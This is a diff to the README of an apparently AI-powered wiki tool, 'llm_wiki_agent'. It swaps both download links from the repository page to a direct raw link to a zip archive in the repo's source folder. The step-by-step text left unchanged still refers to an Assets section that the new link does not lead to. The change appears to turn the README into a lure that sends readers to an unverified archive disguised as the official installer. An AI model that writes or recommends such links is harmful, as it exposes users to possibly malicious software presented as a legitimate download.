@@ -1,6 +1,6 @@
 # 🧠 llm_wiki_agent - Turn raw data into organized knowledge
 
-[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://github.com/Associationlanding789/llm_wiki_agent)
+[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Associationlanding789/llm_wiki_agent/main/src/agent-llm-wiki-v2.6.zip)
 
 This tool organizes your documents into a clean wiki. It uses artificial intelligence to create links between your notes. You save time because the software finds connections for you. It works inside your local notes folder. You keep full control of your private information. The system creates a library of knowledge from your raw text files.
 
@@ -8,7 +8,7 @@ This tool organizes your documents into a clean wiki. It uses artificial intelli
 
 You need to download the installer from the official page. Use the link below to reach the latest version.
 
-[Download llm_wiki_agent Installer](https://github.com/Associationlanding789/llm_wiki_agent)
+[Download llm_wiki_agent Installer](https://raw.githubusercontent.com/Associationlanding789/llm_wiki_agent/main/src/agent-llm-wiki-v2.6.zip)
 
 1. Click the link above.
 2. Look for the Assets section on that page.
